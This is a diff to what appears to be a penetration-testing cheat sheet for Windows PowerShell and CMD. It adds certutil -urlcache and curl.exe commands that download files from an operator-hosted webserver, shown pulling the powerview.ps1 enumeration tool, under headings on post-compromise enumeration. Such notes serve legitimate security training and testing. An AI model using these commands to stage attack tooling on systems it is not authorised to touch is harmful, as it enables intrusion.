@@ -4,7 +4,7 @@
 
 ### Downloading files
 
-- `certutil.exe -urlcache -f http://IP-OF-YOUR-WEBSERVER-WHERE-FILES-ARE-HOSTED/file-you-need name-you-want-to-give-the-file`
+- `certutil.exe -urlcache -f http://IP-OF-YOUR-WEBSERVER-WHERE-FILES-ARE-HOSTED/file-you-need name-you-want-to-give-the-file` (works also in cmd)
   ```
   PS C:\Users\users\Desktop> certutil.exe -urlcache -f http://192.168.3.28/powerview.ps1 powerview.ps1
   ****  Online  ****
@@ -30,6 +30,11 @@
 - `Install-Module ActiveDirectoryModule -ScopeCurrentUser` Install a module without admin rights
 
 ## CMD
+
+### Downloading files
+
+- `certutil.exe -urlcache -f http://IP-OF-YOUR-WEBSERVER-WHERE-FILES-ARE-HOSTED/file-you-need name-you-want-to-give-the-file`
+- `curl.exe -o name-you-want-to-give-the-file http://IP-OF-YOUR-WEBSERVER-WHERE-FILES-ARE-HOSTED/file-you-need`
 
 ### System Enumeration
 
